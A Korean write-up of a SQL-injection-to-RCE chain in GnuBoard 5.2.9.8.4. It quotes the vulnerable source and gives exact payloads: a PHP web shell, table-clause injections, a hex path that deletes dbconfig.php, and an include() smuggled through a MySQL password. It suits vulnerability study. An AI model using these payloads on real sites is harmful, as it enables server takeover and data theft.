# 그누보드 5.2.9.8.4 RCE
>해당 취약점은 그누보드 5.2.9.8.4 에서 터지는 SQL Injection을 이용한 RCE 취약점입니다.
>
## 취약점 설명
>그누보드 /bbs/move_update.php 29~30,164 라인
<pre><code>$move_bo_table = $_POST['chk_bo_table'][$i];
$move_write_table = $g5['write_prefix'] . $move_bo_table;</code></pre>
>위의 코드를 보면 별다른 검증없이 "$_POST['chk_bo_table'][$i]" 변수의 값을 "$move_write_table" 변수에 넣어주는것을 알 수 있습니다.
<pre><code>sql_query(" update $move_write_table set wr_parent = '$save_parent' where wr_id = '$insert_id' ");</code></pre>
>그리고 위와 같이 sql_query함수를 이용하여 update 하는 SQL을 날려주는데 이때 테이블 clause에서 SQL Injection이 가능하여 다른 테이블의 값을 조작할 수 있습니다.

<pre><code>        $sql = " insert into {$g5['board_file_table']}
                    set bo_table = '{$bo_table}',
                         wr_id = '{$wr_id}',
                         bf_no = '{$i}',
                         bf_source = '{$upload[$i]['source']}',
                         bf_file = '{$upload[$i]['file']}',
                         bf_content = '{$bf_content[$i]}',
                         bf_download = 0,
                         bf_filesize = '{$upload[$i]['filesize']}',
                         bf_width = '{$upload[$i]['image']['0']}',
                         bf_height = '{$upload[$i]['image']['1']}',
                         bf_type = '{$upload[$i]['image']['2']}',
                         bf_datetime = '".G5_TIME_YMDHIS."' ";
        sql_query($sql);
    }</code></pre>

>그누보드에서 파일을 업로드하는 기능이 있는데 이 파일을 업로드 하면 위와 같이 "g5_board_file" 라는 테이블에 파일 명, 게시판 명, 게시글 번호 등등이 Insert 됩니다.

>이때 간단한 웹 쉘 코드인 "<?php system($_GET['cmd']); ?>" 등의 코드를 작성하여 업로드 합니다.

> 이후 다음과 같은 SQL Injecttion 페이로드 글의 내용을 조작하여 업로드된 진짜 파일명을 알아냅니다
>"notice set wr_content=(select bf_file_name from g5_board_file where wr_id=1 and bo_table=0x6578706c6f6974)#"


<pre><code>        if (!delete_point($row['mb_id'], $bo_table, $row['wr_id'], '쓰기'))
            insert_point($row['mb_id'], $board['bo_write_point'] * (-1), "{$board['bo_subject']} {$row['wr_id']} 글삭제");

        // 업로드된 파일이 있다면 파일삭제
        $sql2 = " select * from {$g5['board_file_table']} where bo_table = '$bo_table' and wr_id = '{$row['wr_id']}' ";
        $result2 = sql_query($sql2);
        while ($row2 = sql_fetch_array($result2)) {
            @unlink(G5_DATA_PATH.'/file/'.$bo_table.'/'.$row2['bf_file']);
            // 썸네일삭제
            if(preg_match("/\.({$config['cf_image_extension']})$/i", $row2['bf_file'])) {
                delete_board_thumbnail($bo_table, $row2['bf_file']);
            }
        }

        // 에디터 썸네일 삭제
        delete_editor_thumbnail($row['wr_content']);</code></pre>

>위는 당시와 비슷한 버전의 글을 삭제하는 delete.php인데 위에서 insert 한 "g5_board_file" 테이블의 "bf_file" 컬럼의 값을 select하여 unlink 하는것을 알 수 있습니다.
>이를 위의 SQL Injection을 이용하여 다음과 같은 페이로드를 이용하여 해당 게시글의 bf_file 컬럼의 값을 변경해주었습니다

>"notice as a inner join `g5_board_file` as b set b.bf_file=0x2e2e2f646174612f6462636f6e6669672e706870 where wr_id=1 and bo_table=0x6e6f74696365#"

<pre><code>$mysql_host  = $_POST['mysql_host'];
$mysql_user  = $_POST['mysql_user'];
$mysql_pass  = $_POST['mysql_pass'];
$mysql_db    = $_POST['mysql_db'];
$table_prefix= $_POST['table_prefix'];
$admin_id    = $_POST['admin_id'];
$admin_pass  = $_POST['admin_pass'];
$admin_name  = $_POST['admin_name'];
$admin_email = $_POST['admin_email'];

$dblink = @mysql_connect($mysql_host, $mysql_user, $mysql_pass);</code></pre>

<pre><code>$file = '../'.G5_DATA_DIR.'/'.G5_DBCONFIG_FILE;
$f = @fopen($file, 'a');
fwrite($f, "<?php\n");
fwrite($f, "if (!defined('_GNUBOARD_')) exit;\n");
fwrite($f, "define('G5_MYSQL_HOST', '{$mysql_host}');\n");
fwrite($f, "define('G5_MYSQL_USER', '{$mysql_user}');\n");
fwrite($f, "define('G5_MYSQL_PASSWORD', '{$mysql_pass}');\n");
fwrite($f, "define('G5_MYSQL_DB', '{$mysql_db}');\n");
fwrite($f, "define('G5_MYSQL_SET_MODE', {$mysql_set_mode});\n\n");
fwrite($f, "define('G5_TABLE_PREFIX', '{$table_prefix}');\n\n");</code></pre>

> "dbconfig.php" 파일이 삭제되면 그누보드에선 install이 되지 않았다고 판단하여 위와 같은 install_db.php를 이용하여 다시 dbconfig.php 파일을 write해줍니다.
> 이 때 "mysql_connect" 함수에서 정상적인 connection을 위해 php코드를 본인의 로컬 mysql 서버에 " ');include($_GET['foo']);// "와 같은 DB or PASSWORD를 셋팅해주고 외부접속을 허용합니다.

>이 후 index.php?foo=파일명&cmd=ls 를 하면 정상적으로 쉘을 획득할 수 있습니다.

## 다른 exploit 방법

>그누보드에서는 각각의 게시판마다 g5_board 테이블에 있는 bo_include_head,bo_include_head 컬럼들의 값을 각각 상단 파일,하단 파일로 include합니다 때문에 다음과 같은 페이로드를 통해서 더욱 간단한 쉘 획득이 가능합니다.

>"notice as a inner join g5_board as b set b.bo_incldue_head=concat(0x2e2e2f646174612f6578706c6f69742f,(select bf_file from g5_board_file where wr_id=글 번호
))where bo_table=0x6578706c6f6974"
